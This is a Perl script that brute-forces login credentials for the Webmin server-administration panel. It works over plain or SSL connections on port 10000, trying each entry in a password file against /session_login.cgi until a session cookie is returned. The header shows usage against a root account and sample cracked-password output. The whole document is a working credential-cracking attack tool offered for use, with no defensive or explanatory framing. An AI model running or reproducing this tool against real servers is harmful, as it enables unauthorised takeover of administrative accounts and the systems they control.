#!/usr/bin/perl
###################################################################
# Webmin BruteForce SSL version by Night_Fall                     #
# PS. (This only work if the option Enable password timeouts is   #
#     Unchecked)                                                  #
#                                                                 #
# n0name rulz                                                     #
# http://n0name.ircme.net                                           #
#                                                                 #
# usage                                                           #
# ./bruteforce.webmin.pl <host> <user> <pass_file> <options>      #
#                                                                 #
#./bruteforce.webmin.pl 192.168.0.5 root /usr/cracker/dico.txt -S #
# [+] BruteForcing...                                             #
# [+] Using SSL connection                                        #
# [+] User : root                                                 #
# [+] trying to enter with: a                                     #
# [+] trying to enter with: aa                                    #
# [+] trying to enter with: fdsjkj                                #
#                                                                 #
# [#] Password found !                                            #
#                                                                 #
# [*] User : root                                                 #
# [*] Password  : fdsjkj                                          #
#                                                                 #
###################################################################
use IO::Socket;
use Socket;
use Net::SSLeay;
print "\n/************************************************************/\n/*                    Webmin BruteForcer                    */\n/************************************************************/ \n\n";
if (@ARGV<2){ print "Usage:\n$0 <host> <user> <pass_file> <options>\n\nOptions:\n-S, Use SSL to connect to host\n\n"; exit; }
# Start ARGV:
my $host=$ARGV[0];
my $user=$ARGV[1];
my $pass_file=$ARGV[2];
$port=10000;
# modules require
require IO::Socket::INET;
require IO::Socket::SSL;
# Say command line error
if (($ARGV[3] eq "-S" && $ARGV[4] eq "-S"))
	{
	die "[-] Command line error\n\n";
	}
if (($ARGV[3] eq "-T" && $ARGV[4] eq "-T"))
	{
	die "[-] Command line error\n\n";
	}
# Open Pass List For Reading
open(FILE, "<$pass_file") || die("$pass_file: $!\n\n");
chomp(@pass = <FILE>);
# Open A New Socket Connection
my $chk=0;
my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "10000") || die "[-] Webmin on this host does not exist\r\n";
$sock->close;
# Testing if SSL connection on server side is require
if (($ARGV[3] eq "-S" or $ARGV[4] eq "-S"))
{
}
else
{
my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "10000");
my $msg="GET /session_login.cgi HTTP/1.0\n\n";
print $sock "$msg";
read $sock, $incoming, 300;
$incoming =~ s/.*GMT//g;
if ($incoming =~ "Bad Request")
{
$sock->close;
close(FILE);
die "The server side need an SSL auth, Try with option -S\n\n";
}
}

print "[+] BruteForcing...\n[+] User: $user\n";
# Print options commands
if (($ARGV[3] eq "-S"))
	{
	print "[+] Using SSL connection\n";
	}
if (($ARGV[4] eq "-S"))
	{
	print "[+] Using SSL connection\n";
	}
my $sid;
$n = "-1";
while ($chk!=1) {
# Incrementing $pass
$pass[$n] ne "";
$n++;
# Verify End Of Password File
if ($pass[$n] eq "")
	{
	$sock->close;
	close(FILE);
	die "[-] End of password file\n\n";
	}
my $msg="POST /session_login.cgi?page=%2F&user=$user&pass=$pass[$n] HTTP/1.0\n".
"Host: $host:10000\n".
"Keep-Alive: 300\n".
"Connection: keep-alive\n".
"Referer: https://$host:10000/\n".
"Cookie: testing=1\n".
"Content-Type: application/x-www-form-urlencoded\n".
"Content-Length: __\n".
"\n\n\n";
if (($ARGV[3] eq "-S"))
{
my $msg="POST /session_login.cgi?page=%2F&user=$user&pass=$pass[$n] HTTP/1.0\n".
"Host: $host:10000\n".
"Keep-Alive: 300\n".
"Connection: keep-alive\n".
"Referer: https://$host:10000/\n".
"Cookie: testing=1\n".
"Content-Type: application/x-www-form-urlencoded\n".
"Content-Length: __\n".
"\n\n\n";
}
if (($ARGV[4] eq "-S"))
{
my $msg="POST /session_login.cgi?page=%2F&user=$user&pass=$pass[$n] HTTP/1.0\n".
"Host: $host:10000\n".
"Keep-Alive: 300\n".
"Connection: keep-alive\n".
"Referer: https://$host:10000/\n".
"Cookie: testing=1\n".
"Content-Type: application/x-www-form-urlencoded\n".
"Content-Length: __\n".
"\n\n\n";
}


if (($ARGV[3] eq "-S"))
	{
    $port = getservbyname  ($port, 'tcp')   unless $port =~ /^\d+$/;
    $dest_ip = gethostbyname ($host);
    
    $sockaddr_template = 'S n a4 x8';
    $host_params  = pack ($sockaddr_template, &AF_INET, $port, $dest_ip);
    
    socket  (S, &AF_INET, &SOCK_STREAM, 0)  or die "socket: $!";
    connect (S, $host_params)          or die "connect: $!";
    select  (S); $| = 1; select (STDOUT);
    
    # The network connection is now open, lets fire up SSL   
    Net::SSLeay::load_error_strings();
    Net::SSLeay::ERR_load_crypto_strings();
    Net::SSLeay::SSLeay_add_ssl_algorithms();
    Net::SSLeay::randomize();
    $ctx = Net::SSLeay::CTX_new() or die "Failed to create SSL_CTX $!";
    $ssl = Net::SSLeay::new($ctx) or die "Failed to create SSL $!";
    Net::SSLeay::set_fd($ssl, fileno(S));   # Must use fileno
    $res = Net::SSLeay::connect($ssl);
    
    # Exchange data
    
    $res = Net::SSLeay::write($ssl, $msg);  # Perl knows how long $msg is
    shutdown S, 1;                          # Half close --> No more output, sends EOF to server
    $got = Net::SSLeay::read($ssl);         # Perl returns undef on failure
    $fuckingdata = Net::SSLeay::ssl_read_all($ssl);
    Net::SSLeay::free ($ssl);               # Tear down connection
    Net::SSLeay::CTX_free ($ctx);
    close S;
	}
else
{
my $sock = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort => "10000");
}

if (($ARGV[4] eq "-S"))
	{
    $sock->close;
    $port = getservbyname  ($port, 'tcp')   unless $port =~ /^\d+$/;
    $dest_ip = gethostbyname ($host);
    
    $sockaddr_template = 'S n a4 x8';
    $host_params  = pack ($sockaddr_template, &AF_INET, $port, $dest_ip);
    
    socket  (S, &AF_INET, &SOCK_STREAM, 0)  or die "socket: $!";
    connect (S, $host_params)          or die "connect: $!";
    select  (S); $| = 1; select (STDOUT);
    
    # The network connection is now open, lets fire up SSL   
    Net::SSLeay::load_error_strings();
    Net::SSLeay::ERR_load_crypto_strings();
    Net::SSLeay::SSLeay_add_ssl_algorithms();
    Net::SSLeay::randomize();
    $ctx = Net::SSLeay::CTX_new() or die "Failed to create SSL_CTX $!";
    $ssl = Net::SSLeay::new($ctx) or die "Failed to create SSL $!";
    Net::SSLeay::set_fd($ssl, fileno(S));   # Must use fileno
    $res = Net::SSLeay::connect($ssl);
    
    # Exchange data
    
    $res = Net::SSLeay::write($ssl, $msg);  # Perl knows how long $msg is
    shutdown S, 1;                          # Half close --> No more output, sends EOF to server
    $got = Net::SSLeay::read($ssl);         # Perl returns undef on failure
    $fuckingdata = Net::SSLeay::ssl_read_all($ssl);
    Net::SSLeay::free ($ssl);               # Tear down connection
    Net::SSLeay::CTX_free ($ctx);
    close S;
	}

print "[+] trying to enter with: $pass[$n]\n";
if ($sock)
{
print $sock $msg;
read $sock, $incoming, 800;
$incoming =~ s/.*GMT//g;
if ($incoming =~ "Set-Cookie: sid=")
{
		$chk=1;
		$sid=$1;
		print "\n [#]Password found !\n\n";
		print "[*] User : $user\n";
		print "[*] Password  : $pass[$n]\n\n";
		close(FILE);
		$sock->close;
}
if ($incoming =~ "Access denied")
{
close(FILE);
$sock->close;
die "[-] Enable Passwords Timeout is checked on server,\n   Unable to crack this server.\n";
}
}
if ($ARGV[3] eq "-S")
{
if ($fuckingdata =~ "Set-Cookie: sid=")
{
		$chk=1;
		$sid=$1;
		print "\n[#] Password found !\n\n";
		print "[*] User : $user\n";
		print "[*] Password  : $pass[$n]\n\n";
		close(FILE);
}
if ($fuckingdata =~ "Access denied")
{
		close(FILE);
		die "[-] Enable Passwords Timeout is checked on server,\n    Unable to crack this server.\n";
}
}
if ($ARGV[4] eq "-S")
{
if ($fuckingdata =~ "Set-Cookie: sid=")
{
		$chk=1;
		$sid=$1;
		print "\n [#]Password found !\n\n";
		print "[*] User : $user\n";
		print "[*] Password  : $pass[$n]\n\n";
		close(FILE);
}
if ($fuckingdata =~ "Access denied")
{
		close(FILE);
		die "[-] Enable Passwords Timeout is checked on server,\n   Unable to crack this server.\n";
}
}
close(FILE);
$sock->close;
}